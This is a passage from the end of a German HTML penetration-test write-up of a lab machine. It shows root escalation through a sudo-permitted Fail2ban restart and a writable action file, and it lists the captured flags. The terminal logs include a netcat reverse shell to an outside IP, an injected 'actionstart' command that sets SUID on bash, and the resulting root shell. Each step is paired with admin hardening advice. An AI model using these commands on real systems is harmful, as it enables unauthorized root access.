+              **Empfehlung (Admin):** `sudo`-Regeln für Dienste wie `systemctl restart` sind gefährlich. Wenn ein Benutzer einen Dienst neu starten können muss, spezifische Skripte oder eingeschränkte Berechtigungen verwenden. Konfigurationsdateien von Sicherheitsdiensten wie Fail2ban sollten nur für Root schreibbar sein.</p>
+
+            <p class="comment">Wir implementieren den Fail2ban-Exploit, indem wir eine Konfigurationsdatei modifizieren.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">(Exploit-Payload vorbereiten)</span></div>
+                      <div class="prompt">john@fate:~$ <span class="command">echo "nc 192.168.2.153 1234 -e /bin/bash" > /tmp/iptables</span></div> <span class="password"># Payload (Reverse Shell)</span>
+                      <div class="prompt">john@fate:~$ <span class="command">chmod +x /tmp/iptables</span></div>
+                      <div class="prompt"># <span class="command">(Fail2ban Aktionsdatei modifizieren - Annahme: Schreibrechte vorhanden)</span></div>
+                      <div class="prompt">john@fate:/tmp$ <span class="command">nano /etc/fail2ban/action.d/iptables-common.conf</span></div>
+                       <pre>
+# Ursprüngliche Zeile (Beispiel):
+# iptables = iptables <lockingopt> [...]
+# Geänderte Zeile:
+<span class="password">iptables = /tmp/iptables <lockingopt></span> <span class="password"># Pfad zum iptables-Befehl auf unser Skript umgebogen</span>
+                       </pre>
+                       <div class="prompt"># <span class="command">(Listener starten auf Port 1234)</span></div>
+                        <div class="prompt"># <span class="command">nc -lvnp 1234</span></div>
+                       <pre>listening on [any] 1234 ...</pre>
+                       <div class="prompt"># <span class="command">(Fail2ban neu starten, um Exploit auszulösen)</span></div>
+                       <div class="prompt">john@fate:/tmp$ <span class="command">sudo /usr/bin/systemctl restart fail2ban</span></div>
+                        <div class="prompt"># <span class="command">(Verbindung auf Listener erwartet - Im Log wird stattdessen SUID Bash gezeigt)</span></div>
+                       <div class="prompt"># <span class="command">(Alternative/Korrigierter Exploit im Log: SUID Bash statt Reverse Shell)</span></div>
+                       <div class="prompt">john@fate:/tmp$ <span class="command">nano /etc/fail2ban/action.d/iptables-common.conf</span></div>
+                        <pre>
+# Geänderte Zeile (Beispiel 2):
+<span class="password">actionstart = /bin/chmod u+s /bin/bash</span> <span class="password"># Befehl direkt in actionstart</span>
+                        </pre>
+                       <div class="prompt">john@fate:/tmp$ <span class="command">sudo /usr/bin/systemctl restart fail2ban</span></div>
+                       <div class="prompt">john@fate:/tmp$ <span class="command">watch -n 0 ls -alh /bin/bash</span></div> <span class="password"># Überwachen der Bash-Berechtigungen</span>
+                       <pre># (Nach kurzer Zeit sollte das SUID-Bit erscheinen)</pre>
+                       <div class="prompt">john@fate:/tmp$ <span class="command">ls -al /bin/bash</span></div>
+                        <pre><span class="password">-rwsr-xr-x</span> [...] /bin/bash</pre>
+                        <div class="prompt">john@fate:~$ <span class="command">/bin/bash -p</span></div>
+                       <div class="prompt"><span class="command">bash-5.1#</span> <span class="password"># Root-Shell!</span></div>
+                       <div class="prompt">bash-5.1# <span class="command">id</span></div>
+                        <pre><span class="command">uid=1001(john) gid=1001(john) euid=0(root) egid=0(root) grupos=0(root),1001(john)</span></pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:**
+              1.  Der erste Ansatz im Log verwendet einen Reverse-Shell-Payload (`nc -e ...`) in `/tmp/iptables` und versucht, den `iptables`-Befehl in der Fail2ban-Aktionsdatei darauf umzubiegen.
+              2.  Der zweite, erfolgreich gezeigte Ansatz modifiziert direkt die `actionstart`-Direktive in einer Fail2ban-Aktionsdatei (z.B. `iptables-common.conf`), um `chmod u+s /bin/bash` auszuführen. `actionstart` wird beim Start/Neustart von Fail2ban ausgeführt.
+              3.  Wir führen `sudo systemctl restart fail2ban` aus. Dies führt den modifizierten `actionstart`-Befehl als Root aus.
+              4.  Das SUID-Bit wird erfolgreich auf `/bin/bash` gesetzt.
+              5.  Wir führen `/bin/bash -p` aus, um eine Shell mit Root-Rechten (euid=0) zu erhalten.</p>
+               <p class="evaluation">**Bewertung:** Privilege Escalation zu Root erfolgreich! Die unsichere `sudo`-Regel für `systemctl restart fail2ban` in Kombination mit schreibbaren Fail2ban-Konfigurations-/Aktionsdateien wurde ausgenutzt.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Root-Flag lesen, Bericht abschließen.
+               **Empfehlung (Admin):** `sudo`-Regel entfernen. Berechtigungen für Fail2ban-Konfigurationsdateien härten (nur für Root schreibbar).</p>
+
+               <p class="comment">Als Root lesen wir die Flags.</p>
+                <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt">bash-5.1# <span class="command">cd /root</span></div>
+                        <div class="prompt">bash-5.1# <span class="command">ls</span></div>
+                       <pre>note.txt  <span class="command">root.txt</span></pre>
+                        <div class="prompt">bash-5.1# <span class="command">cat root.txt</span></div>
+                       <pre><span class="password">Cyborgsdontfeelpain</span></pre>
+                    </div>
+                </div>
+                 <p class="analysis">**Analyse:** Aus der Root-Shell lesen wir die `root.txt`.</p>
+                 <p class="evaluation">**Bewertung:** Root-Flag erfolgreich gelesen.</p>
+                 <p class="recommendation">**Empfehlung (Pentester):** Ergebnisse dokumentieren.
+                 **Empfehlung (Admin):** Alle identifizierten Schwachstellen beheben.</p>
+         </section>
+
+         <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/john/user.txt</div> <!-- Korrigierter Pfad -->
+                    <div class="flag-value"><span class="password">Ineedyourboots</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">Cyborgsdontfeelpain</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 24. Oktober 2022</p> <!-- Datum aus Nmap/Nikto Scan extrahiert -->
+    </footer>
+</body>
+</html>
